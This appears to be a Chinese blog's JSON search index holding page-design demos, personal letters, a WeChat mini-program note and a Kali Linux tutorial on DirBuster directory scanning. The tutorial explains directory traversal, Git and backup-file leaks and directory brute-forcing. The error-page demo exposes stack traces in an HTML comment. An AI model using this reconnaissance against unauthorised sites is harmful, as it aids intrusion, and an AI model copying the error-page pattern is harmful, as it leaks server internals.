createScene();\n        initScene();\n\n        timeInfo.start &#x3D; new Date();\n        timeInfo.prev &#x3D; timeInfo.start;\n        animate();\n    &#125;);\n\n    &#x2F;&#x2F;set window.requestAnimationFrame\n    (function (w, r) &#123;\n        w[&#39;r&#39;+r] &#x3D; w[&#39;r&#39;+r] || w[&#39;webkitR&#39;+r] || w[&#39;mozR&#39;+r] || w[&#39;msR&#39;+r] || w[&#39;oR&#39;+r] || function(c)&#123; w.setTimeout(c, 1000 &#x2F; 60); &#125;;\n    &#125;)(window, &#39;requestAnimationFrame&#39;);\n&lt;&#x2F;script&gt;\n\n&lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;","slug":"design_LoginPage_2021_11_01","date":"2021-10-31T17:33:52.000Z","categories_index":"Web Page","tags_index":"设计","author_index":"Arvin"},{"id":"922522eb16175498ad4c55c094fe3b58","title":"Error Page 设计演示01","content":"分享大家一个好看的 Error Page 代码\n\n演示图\n演示代码&lt;!--\n    Developer: @Arvin\n    Explain: Error Page\n--&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;utf-8&quot;&#x2F;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width,initial-scale&#x3D;1.0&quot;&#x2F;&gt;\n    &lt;title&gt;Error Page&lt;&#x2F;title&gt;\n    &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;\n        &#x2F;* 导入字体 @Arvin *&#x2F;\n        @import url(&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;css2?family&#x3D;Bowlby+One+SC&amp;display&#x3D;swap&quot;);\n\n        :root &#123;\n            --background-color: #000;\n            --border-color    : #7591AD;\n            --text-color      : #34495e;\n            --color1          : #EC3E27;\n            --color2          : #f01d67;\n            --color3          : #1474bd;\n            --color4          : #04ffcd;\n            --color5          : #fdcb6e;\n            --color6          : #e056fd;\n            --color7          : #F97F51;\n            --color8          : #BDC581;\n        &#125;\n\n        * &#123;\n            margin : 0;\n            padding: 0;\n        &#125;\n\n        html &#123;\n            font-size: 14px;\n        &#125;\n\n        body &#123;\n            width           : 100vw;\n            height          : 100vh;\n            background-color: var(--background-color);\n            display         : flex;\n            justify-content : center;\n            align-items     : center;\n            font-family     : &#39;Montserrat&#39;, sans-serif, Arial, &#39;Microsoft Yahei&#39;;\n        &#125;\n\n        .channel &#123;\n            position   : absolute;\n            width      : 80%;\n            text-align : center;\n            top        : 50%;\n            left       : 50%;\n            transform  : translate(-45%, -200px);\n            font-size  : 30px;\n            font-weight: bold;\n            color      : #fff;\n        &#125;\n\n        .box &#123;\n            width              : 350px;\n            &#x2F;* background-color: #fff; *&#x2F;\n\n            display        : flex;\n            justify-content: space-around;\n            align-items    : center;\n\n            transform-style: preserve-3d;\n        &#125;\n\n        .box p &#123;\n            position        : relative;\n            font-size       : 100px;\n            font-family     : &#39;Bowlby One SC&#39;, Arial, Helvetica, sans-serif;\n            color           : #FFF;\n            transform       : scale(0.9, 1) rotateY(-45deg);\n            transform-origin: bottom center;\n            animation       : animate 2.5s ease-in-out infinite;\n            animation-delay: calc(var(--i) * 100ms);\n        &#125;\n\n        @keyframes animate &#123;\n            20% &#123;\n                transform: scale(0.9, 1) rotateY(-45deg);\n                text-shadow:\n                        0 0 var(--color2),\n                        0 0 var(--color3),\n                        0 0 var(--color4);\n            &#125;\n\n            40% &#123;\n                transform: scale(0.9, 2) translateY(16px);\n                text-shadow:\n                        -10px -2px var(--color2),\n                        -20px -3px var(--color3),\n                        -30px -4px var(--color4);\n            &#125;\n\n            60% &#123;\n                transform: scale(0.9, 1) rotateY(45deg);\n                text-shadow:\n                        0 0 var(--color2),\n                        0 0 var(--color3),\n                        0 0 var(--color4);\n            &#125;\n\n            80% &#123;\n                transform: scale(0.9, 2) translateY(16px);\n                text-shadow:\n                        10px -2px var(--color2),\n                        20px -3px var(--color3),\n                        30px -4px var(--color4);\n            &#125;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n&lt;H1&gt;Error Page&lt;&#x2F;H1&gt;\n\n&lt;div class&#x3D;&quot;channel&quot;&gt;\n    TCT 呼叫程序猿大大 ＞﹏＜\n&lt;&#x2F;div&gt;\n\n&lt;div class&#x3D;&quot;container&quot;&gt;\n    &lt;div class&#x3D;&quot;box&quot;&gt;\n        &lt;p style&#x3D;&quot;--i:1&quot;&gt;E&lt;&#x2F;p&gt;\n        &lt;p style&#x3D;&quot;--i:2&quot;&gt;R&lt;&#x2F;p&gt;\n        &lt;p style&#x3D;&quot;--i:3&quot;&gt;R&lt;&#x2F;p&gt;\n        &lt;p style&#x3D;&quot;--i:4&quot;&gt;O&lt;&#x2F;p&gt;\n        &lt;p style&#x3D;&quot;--i:5&quot;&gt;R&lt;&#x2F;p&gt;\n    &lt;&#x2F;div&gt;\n&lt;&#x2F;div&gt;\n\n&lt;div&gt;\n    &lt;div th:Utext&#x3D;&quot;&#39;&lt;!--&#39;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;div&gt;\n    &lt;div th:utext&#x3D;&quot;&#39;Failed Request URL : &#39; + $&#123;url&#125;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;div&gt;\n    &lt;div th:utext&#x3D;&quot;&#39;Expiration message : &#39; + $&#123;exception.message&#125;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;div&gt;\n    &lt;ul th:remove&#x3D;&quot;tag&quot;&gt;\n        &lt;li th:each&#x3D;&quot;st : $&#123;exception.stackTrace&#125;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;span th:utext&#x3D;&quot;$&#123;st&#125;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;span&gt;&lt;li&gt;\n    &lt;&#x2F;ul&gt;\n    &lt;div th:utext&#x3D;&quot;&#39;--&gt;&#39;&quot; th:remove&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;div&gt;\n&lt;&#x2F;div&gt;\n&lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;","slug":"design_ErrorPage_2021_10_31","date":"2021-10-30T17:23:52.000Z","categories_index":"Web Page","tags_index":"设计","author_index":"Arvin"},{"id":"e110ea6fbbf317e355920dc93f9f4635","title":"404 Page 设计演示01","content":"分享大家一个好看的 404 Page 代码\n\n演示图\n\n代码演示&lt;!--\n    Developer: @Arvin\n    Explain: 404 Page\n--&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;utf-8&quot;&#x2F;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width,initial-scale&#x3D;1.0&quot;&#x2F;&gt;\n    &lt;title&gt;休息一下吧&lt;( ￣^￣)&lt;&#x2F;title&gt;\n    &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;\n        :root &#123;\n            --background-color: #2c3e50;\n            --border-color: #7591AD;\n            --text-color: #34495e;\n            --color1: #EC3E27;\n            --color2: #FD79A8;\n            --color3: #0984E3;\n            --color4: #00B894;\n            --color5: #FDCB6E;\n            --color6: #E056FD;\n            --color7: #F97F51;\n            --color8: #BDC581;\n        &#125;\n\n        * &#123;\n            margin: 0;\n            padding: 0;\n        &#125;\n\n        html &#123;font-size: 14px;&#125;\n\n        body &#123;\n            width: 100vw;\n            height: 100vh;\n            background-color: var(--background-color);\n            background-image: linear-gradient(to right bottom, var(--color_left), var(--color_leftcolor_right));\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            font-family: &#39;Montserrat&#39;, sans-serif, Arial, &#39;Microsoft Yahei&#39;;\n        &#125;\n\n        .channel&#123;\n            position: absolute;\n            width: 80%;\n            text-align: center;\n            top: 50%;\n            left: 50%;\n            transform: translate(-50%, -200px);\n            font-size: 30px;\n            font-weight: bold;\n            color: #fff;\n        &#125;\n\n        .container&#123;\n            width: 600px;\n            display: flex;\n            justify-content: space-between;\n            align-items: center;\n        &#125;\n\n        .container span&#123;\n            display: inline-block;\n            width: 200px;\n            font-size: 240px;\n            &#x2F;*background-color: #ff5f99;*&#x2F;\n            text-align: center;\n            font-weight: 800;\n            font-family: arial, helvetica, sans-serif;\n\n        &#125;\n\n        .container span.middle&#123;\n            position: relative;\n            width: 200px;\n            height: 200px;\n            &#x2F;*background-color: #d0ffc6;*&#x2F;\n        &#125;\n\n        .container span.middle::before,\n        .container span.middle::after&#123;\n            position: absolute;\n            content: &#39;&#39;;\n            width: 200px;\n            height: 200px;\n            top: 0;\n            left: 0;\n            &#x2F;*background-color: #ffbd98;*&#x2F;\n\n            &#x2F;* 效果实现: 内阴影 透明度66(十六进制) &lt;左上右下&gt; @Arvin *&#x2F;\n            box-shadow:\n            inset 30px 0 0 #FD79A866,\n            inset 0 30px 0 #0984E366,\n            inset -30px 0 0 #EC3E2766,\n            inset 0 -30px 0 #D0FFc666;\n            border-radius: 50%;\n            animation: animate_before 5s linear infinite;\n        &#125;\n\n        .container span.middle::after&#123;\n            transform: rotate(-45deg);\n        &#125;\n\n        &#x2F;* 动画效果: 分成四次顺时针切换四个阴影颜色 @Arvin *&#x2F;\n        @keyframes animate_before&#123;\n            0%&#123;\n                box-shadow:\n                        inset 30px 0 0 #FD79A866,\n                        inset 0 30px 0 #0984E366,\n                        inset -30px 0 0 #EC3E2766,\n                        inset 0 -30px 0 #D0FFc666;\n            &#125;\n            25%&#123;\n                box-shadow:\n                        inset 30px 0 0 #0984E366,\n                        inset 0 30px 0 #EC3E2766,\n                        inset -30px 0 0 #D0FFc666,\n                        inset 0 -30px 0 #FD79A866;\n            &#125;\n            50%&#123;\n                box-shadow:\n                        inset 30px 0 0 #EC3E2766,\n                        inset 0 30px 0 #D0FFc666,\n                        inset -30px 0 0 #FD79A866,\n                        inset 0 -30px 0 #0984E366;\n            &#125;\n            75%&#123;\n                box-shadow:\n                        inset 30px 0 0 #D0FFc666,\n                        inset 0 30px 0 #FD79A866,\n                        inset -30px 0 0 #0984E366,\n                        inset 0 -30px 0 #EC3E2766;\n            &#125;\n            100%&#123;\n                box-shadow:\n                        inset 30px 0 0 #FD79A866,\n                        inset 0 30px 0 #0984E366,\n                        inset -30px 0 0 #EC3E2766,\n                        inset 0 -30px 0 #D0FFc666;\n            &#125;\n        &#125;\n\n        &#x2F;* 左侧文字效果：分四次将当前文字颜色变换为 左侧内阴影的颜色 @Arvin *&#x2F;\n        .container span:nth-child(1)&#123;\n            animation: animate_span_1 5s linear infinite;\n        &#125;\n\n        &#x2F;*动画 @Arvin *&#x2F;\n        @keyframes animate_span_1&#123;\n            0%&#123;\n                color: #FD79A866;\n            &#125;\n            25%&#123;\n                color: #0984E366\n            &#125;\n            50%&#123;\n                color: #EC3E2766;\n            &#125;\n            75%&#123;\n                color: #D0FFc666\n            &#125;\n            100%&#123;\n                color: #FD79A866;\n            &#125;\n        &#125;\n\n        &#x2F;* 右侧文字效果：分四次将当前文字颜色变换为 右侧内阴影的颜色 @Arvin *&#x2F;\n        .container span:nth-child(3)&#123;\n            animation: animate_span_3 5s linear infinite;\n        &#125;\n\n        &#x2F;*动画 @Arvin *&#x2F;\n        @keyframes animate_span_3&#123;\n            0%&#123;\n                color: #FD79A866;\n            &#125;\n            25%&#123;\n                color: #D0FFc666;\n            &#125;\n            50%&#123;\n                color: #EC3E2766;\n            &#125;\n            75%&#123;\n                color: #0984E366;\n            &#125;\n            100%&#123;\n                color: #FD79A866;\n            &#125;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body&gt;\n\n&lt;div class&#x3D;&quot;channel&quot;&gt;\n    TCT 代码中遇见二次元 🤍\n&lt;&#x2F;div&gt;\n\n&lt;div class&#x3D;&quot;container&quot;&gt;\n    &lt;span&gt;4&lt;&#x2F;span&gt;\n    &lt;span class&#x3D;&quot;middle&quot;&gt;&lt;&#x2F;span&gt;\n    &lt;span&gt;4&lt;&#x2F;span&gt;\n&lt;&#x2F;div&gt;\n\n&lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;","slug":"design_404Page_2021_10_31","date":"2021-10-30T17:13:52.000Z","categories_index":"Web Page","tags_index":"设计","author_index":"Arvin"},{"id":"0b9f79c29d3ce014ff3312dd5fa83477","title":"2021.10.08日本记","content":"\n\n\n\n\n\n\n\n\n东皇将逝，我已寻她千百度，蓦然回首，向黄昏许愿，等风起，等花开，等我们相遇\n\n\n","slug":"img_rb_xiaoj_2021.10.08.01","date":"2021-10-08T11:42:50.000Z","categories_index":"小记","tags_index":"日本风景","author_index":"Arvin"},{"id":"abb5ed676250fb58c884cc748f2652b9","title":"【無憂樹洞】致未来的你，情书Ⅲ","content":"夜已深，心却一点都不静。如果是你，我就和你说说话，唠唠嗑，聊聊天。因为，除了你，没有人会在意也没有人会关心，心，怎么了。也没有人会了解。和大部分人说话，是一件很浪费心力和时间的事情，因为他们的眼里，是看不见别人的。沟通，聊天，但是不会产生了解。他不知道你说这件事情，究竟在说什么，他不了解，你内心的情绪和想法。如果是你，就会很不一样吧。我应该会很喜欢和你说话，大大小小的事情，芝麻绿豆的事情，说着说着，或者没说，看见你，就哭花了脸，你也不会慌张，也不会问我怎么了，你只要温柔的看着我哭，陪着我就好了。\n我醒来，我就觉得好难受。我也不知道为什么。我不知道是心里有什么东西在消融，冰冻的部分在一点点融化，还是发生了什么，我不知道发生了什么，但是我会觉得心绪很不安宁，也或者大姨妈要来了。不过对我来说，这种不正常和波动，是一种正常。我时常这样抽风一下，莫名的就觉得烦躁，不不舒服，什么都不想做，这是一种病。如果是你，你大概会说，没关系呀，你有病，我有药。哈哈。是呀，你可以像撸猫咪一样，撸我，我们就这样静静的待着，坐着，靠着，或躺着。我相信，如果是你，待在你身边，就会觉得很安宁。\n干儿子生日，闺蜜张罗了一个专业拍照的，喊着一些邻居的小朋友，同学。在楼下小区的花园里，草地上，准备切蛋糕。我儿子一个人上楼打游戏。闺蜜问他怎么了。闺蜜总是觉得我对孩子没有约束，没有规矩，太过宠溺。我跟前夫关于孩子的教育也有很多不同的意见。我内心深知，这孩子携带的家族能量有多负面，脾气有多大，我不愿意强迫孩子做什么，我希望给他尽可能多的空间，他们都觉得我没有底线，或者说我的底线太底线。呵呵。。。当周围的人，不断质疑你的时候，你会怀疑吗，你会犹豫吗。我知道，如果是你，你不会的。你内心是有力量的，只要是你认定的，只要是你心里笃信的，别人或周围的任何，都不可能产生什么影响的。我重来不会抗拒和否认他们任何人的观念和想法，我总是表示，你们可以用任何你们觉得对的方式对待孩子，为什么不可以呢，为什么总是要分出个是非对错呢，如果我们无法在某些认知上达成共识，为什么我们不可以用彼此觉得合适的方式，各自去做呢。有时候我会觉得委屈，我也会很傲娇，我觉得我能看到他们看不到的未来，尽管有时候，我也会觉得很烦，不愿意解释，不愿意争论争辩，但是我心里也是清楚的，我知道要怎样对待孩子。我也知道我自己的做法，在更长远的未来，对孩子是有帮助的。你呢，我知道，你不会参与这些，你甚至也不会教导我应该如何，不应该如何。你大概只会很笃定的告诉我，你信任我，也让我信任我自己。\n我感受不到快乐。我和他们在一起，我跟家人在一起，我觉得有点别扭。我特别想要逃离，我想一个人待着。我刚才突然在想，如果你一直都不出现，也许某天，我可能真的找个深山啥的去待待吧。哈哈。虽然我很渴望，和人，和别人有很深的连接，有很深的关系。可是我没有那种感觉。闺蜜的奶奶去世了，我去陪夜，去参加葬礼，我YY着，我身边最亲近的人去世，我没有什么感觉。我也不知道，那种感觉是冻住了，还是我真的少一些什么。我有时候会觉得很累。因为他们都有他们对世界的认知，应该怎样应该怎样。。。所有的言行都会包含这样的控制的能量，这让我觉得不放松，不舒服。我显得如此格格不入。因为我不在他们所有的应该之中。哈哈。。。活了那么久，我仿佛离他们越来越远。可是，这样会离你更近吗？\n我又暴饮暴食，我觉得我又胖了。一直都没有瘦。回国之后，就没瘦。时常暴饮暴食。我知道，我是不愿意面对自己的，我总觉得我还没有做好准备。面对自己，真的需要很多能量呀，我有时候什么都不想做，也不愿意做。阿卡西记录的课程上完都有两个月了，我也没怎么做练习。我知道我有一切的资源和方法和工具，去解决我自己的问题，我就是不愿意面对，我觉得我还没有准备好，我不敢，我没有勇气，我也没有能量。你看，我什么都没有做，我只是做了一点点，前段时间多做了几次能量疗愈，做了几次舞动静心，我还是能感觉到身体的动荡和释放，我还是会觉得好困难，我觉得面对自己，拆解自己，真的，没人知道，但是内心就是波澜壮阔，波涛汹涌，不会游泳，分分钟钟，时常被呛水被淹没，越挣扎还越下沉。我知道，把现在的一切敲碎，剥离，会很不一样，我会遇见也许我从未遇见过从未了解过的自己，可是这个过程真的好难，迈出第一步都好难。我甚至有时候在想，上帝是不是把你安排在这些关卡之后呢，我是不是要通关这个部分，才会遇见你呢。我身边没有什么长久的关系，也没有什么深入的关系，很多人，都像过客，来来去去。是不是因为我自己也没有什么耐心，我对待自己也没有足够的耐心。上帝一定觉得，现在的我，还不到时间遇见你吧，因为遇见了，以我们现在的能力，也无法长久的彼此陪伴吧。可是，坦白说，如果真的是这样，我也生不起，为了遇见你，而让自己快速的变得更好的欲望。哈哈。。。我没有那样的欲望，我会想要让自己好一点，更好一点，不要暴饮暴食，好好关照身体，但是也只是我有这样的念头，这种念头都时常在飘忽，都没有什么稳固，也谈不上非要如此。刚才洗澡的时候，还在想，如果余生，只做一件事，就是把身体这座庙宇好好修缮，估计也是很有意思的，我也可以成为某个匠人，在这件事上，成为专家。可我也就这样想想。你说，为什么我那么没有行动力。你会告诉我，不用担心这个，不是所有人都需要有行动力的，没有就没有，做好眼前每一件事就可以了。你一定会告诉我，如果你在，你就会安顿好我的心，心安定了，然后就享受每一件事就可以，就那么简单，没有那么复杂的。你一定会告诉我，让我的脑子里，想着你就可以了，不用想其他乱七八糟的事情。这个对白好熟悉呀，我曾经梦到过。你呢，你梦到过吗？你还会跟我说，如果下次再想乱吃东西，就找你说话吧。食物只是情绪的安慰剂，而如果有你，我大概就不需要别的安慰剂了，你就是最好的药了。\n嗯，吃一颗，YY你的药。然后乖乖睡觉。\n不管怎样，我都要自己生长出一点能量，关照好自己的身体，起码要等到，遇见你的那天。\n你会不会，有一天，看完我写给你的情书，\n然后跟我说，傻瓜，我来了，虽然晚了一点，人间交通太拥挤，不过，我还是来了。而且，我知道，你等的就是我。因为我来自我们的未来。\n\n我只是在呢喃自语，\n如果你看了，就已经是一种见证和陪伴了，\n因为我知道一定会有人看。\n如果有什么信息能和你共鸣，\n你从中看见了自己，\n那就是另外的收获了。\n如果你看懂了，\n你从中看见了我，\n还能有什么回应，\n并且这回应我们还可以彼此共振，\n那就是更大的惊喜了。\n没有无缘无故的遇见。\n致敬未知。\n","slug":"epistle.2021.10.08.01","date":"2021-10-08T11:12:38.000Z","categories_index":"书信","tags_index":"小柔书信","author_index":"Arvin"},{"id":"82453e540b149cc9f4b8be3c94d59982","title":"微信小程序结构目录","content":"微信小程序结构目录\n\n\n\n\n\n\n\n\n微信小程序框架的目标是通过尽可能简单、高效的方式让开发者可以在微信中开发具有原生 App 的体验的服务。\n小程序框架提供了自己的视图层描述语言 WXML 和 WXSS ,以及 JavaScript ，并在视图层与逻辑层间提供了数据传输和事件系统，让开发者能够专注于数据与逻辑。\n\n小程序文件结构和传统 Web 对比\n\n\n结构\n传统 Web\n微信小程序\n\n\n\n结构\nHTML\nWXML\n\n\n样式\nCSS\nWXSS\n\n\n逻辑\nJavaScript\nJava script\n\n\n配置\n无\nJSON\n\n\n通过以上对比得出，传统 Web 是三层结构。而微信小程序是四层结构，多了一层 配置.json\n\n基本的项目目录\n","slug":"wx_AppletsStructureDirectory","date":"2021-10-08T10:43:50.000Z","categories_index":"程序","tags_index":"教学文档,微信小程序","author_index":"Arvin"},{"id":"2d74fe493fced2c13a4b985d6ad291e2","title":"Kali-Linux 目录扫描 Dirbuster","content":"Kali Linux 目录扫描 Dirbuster\n\n\n\n\n\n\n\n\n注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规\nLali Linux 系列第四篇信息收集第四章 目录扫描 Dirbuster\n目录扫描的作用文件目录\n\n\n\n\n\n\n\n\n\n文件目录是指：为实现 “按名存取”，必须建立文件名与辅存空间中物理地址的对应关系，体现这种对应关系的数据结构称为文件目录。\n目录扫描\n\n\n\n\n\n\n\n\n\n目录扫描可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构。\n通过目录扫描我们还可以扫描敏感文件，后台文件，数据文件，和信息泄露文件等等\n目录扫描是信息收集技术的重要部分\n\n常见的目录信息泄露目录遍历漏洞\n\n\n\n\n\n\n\n\n\n目录遍历（路径遍历）是由于 Web 服务器或者 Web 应用程序对用户输入的文件名称的安全验证不足而导致的一种安全漏洞，使得攻击者可以通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以使 Web 根目录以外的文件），甚至执行系统命令。\n目录遍历漏洞原理\n\n\n\n\n\n\n\n\n\n程序在实现上没有充分过滤用户输入的 ..&#x2F; 之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。\n\n敏感信息泄露\n\n\n\n\n\n\n\n\n\n由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易访问到\n例如：\n\n\n\n\n\n\n\n\n\n\n通过访问 url 下的目录，直接可以列出目录下的文件列表；\n输入错误的 url 参数后报错信息里面包含操作系统、中间件、开发语言的版本或者其他信息（SQL 注入）；\n前端的源码（html 、Css 、Js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账户密码等；\n\n\n常见的源码泄露案例目录遍历\n\n\n\n\n\n\n\n\n\n当没有默认网页时，在网站上显示 WEB 服务器显示用户列表中的文件和目录，在 apahce 服务器上面默认文化名为 Index.php，当没有上传 index.php 时，服务器就会将文件夹中的内容全部展示出来。\n实例\n\n\n\n\n\n\n\n\n\n攻击者浏览目录并访问 Web 应用程序的源代码，备份和可能的数据库文件。\n源码泄露案例：链接\n\nGit 源码泄露\n\n\n\n\n\n\n\n\n\n漏洞成因：在允许 Git init 初始化代码库的时候，会在当前目录下面产生一个 Git 的隐藏文件，用来记录代码的变更记录等。在发布代码的时候，把这个 Git 目录没有删除，直接发布了。使用这个文件，可以用来回复源代码。\n\n漏洞利用：\n工具：GitHack\nDS_Store 文件泄露\n\n\n\n\n\n\n\n\n\n漏洞成因：\n在发布代码时未删除文件夹中隐藏的 DS_Store，被发现后，获取了敏感的文件名等信息。\n\n漏洞利用：\n实例网址\n网站备份压缩文件\n\n\n\n\n\n\n\n\n\n在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 Web 目录下，该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。\n该漏洞的成因主要有以下两种：\n\n服务器管理员错误的将网站或者网页备份文件放置到服务器 Web 目录下\n编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在 Web 目录下。\n\n\n常见的目录扫描方式\nRobots.txt\n\n\n\n\n\n\n\n\n\n\n网站内的 Robtos 文件\n\n目录爆破\n\n\n\n\n\n\n\n\n\n\n御剑\nNikto\nDirbuster （推荐）\nWebdirscan\n自制字典\n等工具\n都是通过字典、枚举进行爆破\n\n第三方资源引用\n\n\n\n\n\n\n\n\n\n\nJS\n外部链接\n内部链接\nSDK （第三方软件开发工具包）\n目录扫描工具 - Dirbuster工具说明：\n\n\n\n\n\n\n\n\n\nOwasp 项目\n\nDirBuster 是一个多线程的基于 Java 的应用程序设计用于暴力破解 Web 应用服务器上的目录名和文件的工具\n工作原理\n\nDirBuster 是一种履带式（遍历）和粗暴式（爆破）的混合物；\n它遵循它找到的页面中的所有链接，但也为可能的文件尝试不同的名称。这些名称可能位于与我们使用的文件类型的文件中，也可能由 Dirbuster 使用 Pure Brute Force 选项自动生成（暴力破解），并设置字符集以及生成的单词的最小和最大长度（撞库字典）。\n为确定文件是否存在，DirBuster 使用服务器的响应代码。最常见的响应如下：\n\n200 ok ：文件存在\n404 找不到 404 文件 ：服务器中不存在该文件\n301 301永久移动 ：这是重定向到给定的 URL\n302 302永久移动 ：这是重定向到给定的 URL\n401 Unauthorized ：访问此文件需要身份验证\n403 Forbidden ：请求有效但服务器拒绝响应\n5 开头表示服务器存在问题\n\nDirBuster，它是用来探测 Web 目录结构和隐藏的敏感文件的\n\n环境配置：\n\n\n\n\n\n\n\n\n\n使用需求：\nDirBuster 是基于 Java 的应用程序需要 Jre 环境\nJava环境下载：加载器\n安装过程中一定要勾选 &quot;add to path&quot; (添加环境变量) \n\nDirBuster 下载地址：下载地址\n安装：\nWindows 双击 DirBuster.jar 启动软件\nLinux 用户在命令行运行：.&#x2F;DirBustet-1.0-RC1.sh\nLinux 若脚本无执行权限使用：chmod + x.&#x2F;Dirbuster-1.0-RC1.sh 添加权限\n工具使用介绍:\n\n具体操作步骤：\n\nURL 设置\n线程数设置\n选择爆破字典\n取消选择递归查询\n开始运行\n\n\n其他如果你担心工具有病毒可以采用腾讯的一些工具进行检测\n腾讯检测工具链接：链接SHODAN ：摄像头监控工具\n","slug":"kali-LinuxDirectoryscan_Dirbuster","date":"2021-10-04T20:43:58.000Z","categories_index":"程序","tags_index":"教学文档,Kali Linux","author_index":"Arvin"},{"id":"a4cadb9f5595212ca9fee7c3a775630e","title":"【無憂樹洞】致未来的你，情书Ⅱ","content":"最近一直有这样的念头，要写这样一封情书，给你。\n我也不知道为什么，难道你在某个未知的地方，等着我的这些信息，然后终于寻到，等到彼此吗？\n只是，这个念头，出现了好些日子，一直都没有消散，于是，我想，那就写写吧，毕竟也是一种能量的流动。能量，也没有什么时间和空间，也会反作用在我自己的身上。\n打下这个标题的时候，我是真的写了又删，删了又写。最后还是不免俗套的，起了个很俗很接地气的标题。哈哈。情书是个多美好的字眼。\n其实我知道，你并不在未来，我原本用的是未知，我想你一定是存在的，只是我还不知道。曾经，或者现在，或者未来，如果我们能认出彼此，就一定会知道，我们之间的缘分，一定不是只有这一世那么单薄。所以我想你不仅仅只是未来的。可是我不知道，这一世，你是什么样子，好像未来这个词更可以靠近你。更可以宣示一种，当下没有的状态。哈哈。。\n我是特别的，所以我想，你也一定是独特的。而这样与众不同的气息，在对的人那里，是不是一眼就可以认出，就可以嗅到。我相信，”你给的，正好是我想要的；你说的，恰好我懂”这种默契和灵犀，是写好的剧本，只是我们需要合适的契机，来遇见罢了。\n我有过一段将近十年的婚姻，我知道，这是我必须要经历的剧情。\n而如果是你，你会知道，这个姑娘，原来还一直未长大。你会愿意看着她，陪着她，把那些没有做完的事情，统统做一遍，把那些遗留下来的坑，一个一个填上。在你眼里，只有了解之后的疼惜吧。所以，这是你和别人不同的地方吧。\n我遇见过很有爱的人，内心是善良的，不会吝啬表达爱，也总是会说要相互了解，要共同成长，要一起学习。可是当我望向他的时候，他的眼里没有对于一个人的探索的兴趣，也没有写满的欣赏。我知道，他不是你。\n我遇见过有很深很深的伤痕的人，他们陷在自己的伤痛中，甚至可能都看不见自己的伤痕，在自己的世界里，自己出不来，别人也进不去。这样的人，其实很有生命力，也很有能量，甚至很有爱。但是这些都仿佛冰冻住一样，需要合适的人，来溶解。如果不是我，那么我想，他也不是你。\n我遇见过内心对于爱还有期待，还有幻想的人，但是由于惯性，他们有太多的不安和恐惧。习惯了一个人的生活，一个人的日子，开始觉得恋爱也是麻烦的。渴望被了解，渴望被懂得，却未必渴望相爱。哈哈。。想要开始一段新的感情，又会觉得各种麻烦，各种不安，缩回自己的壳里。习惯是容易的，改变总是困难的。我也不愿意改变这种从形式到内心都是单身的状态，我也觉得恋爱是一件很麻烦的事情，我也知道，关系，亲密关系总是会牵扯出太多的动荡和功课，可是，如果真的是你，我想，我还是会愿意去面对的。\n我不会跟你说，我要怎样怎样。。。让自己成为更好的自己，然后遇见你的时候就怎样怎样，哈哈。。我不是那种妹子。我们可以不用更好，但是需要更真实。我们可以不用追逐任何外在的一切，但是需要内心更有力量。当我自己的能量不足以安定自己的时候，我会觉得，想到你，想到有一个你，一定在某个地方，可以借你的能量来用用。\n为了讨你欢心，做你喜欢的事情；为了你的爱，成为你想要的样子；为了在一起，模糊了自己；这些都不是我们之间的关系和爱情。\n你是你的样子，我是我的样子，看见或知晓，就足够欢喜。\n我们会支持彼此，成为彼此应该是的样子。\n我们会了解和懂得，彼此说了或没有说的言语和情感。\n我们会一起成长，成为真正的成年人。我们也会一直宠溺彼此内心的孩子和童真。\n你懂得，需求的爱与存在的爱，是不同的。\n我们会愿意也会慢慢有能力给予彼此存在的爱与陪伴。\n关系是一场未知的冒险，我们会有足够的耐心，勇气，陪伴和支持彼此，穿越过往，再次生长。\n我不知道，你在哪里，何时会示现。\n我只是相信，你在的吧。\n我也相信，如果是你，来了，就不会走。\n我只是愿意，如果是你，我们再谈一场恋爱。爱情多美好~\n\n我只是在呢喃自语，\n如果你看了，就已经是一种见证和陪伴了，\n因为我知道一定会有人看。\n如果有什么信息能和你共鸣，\n你从中看见了自己，\n那就是另外的收获了。\n如果你看懂了，\n你从中看见了我，\n还能有什么回应，\n并且这回应我们还可以彼此共振，\n那就是更大的惊喜了。\n没有无缘无故的遇见。\n致敬未知。\n","slug":"epistle.2021.10.02.01","date":"2021-10-02T07:02:38.000Z","categories_index":"书信","tags_index":"小柔书信","author_index":"Arvin"},{"id":"fa2dc0aafcae3cbcc49d43059929a46e","title":"Kali-Linux 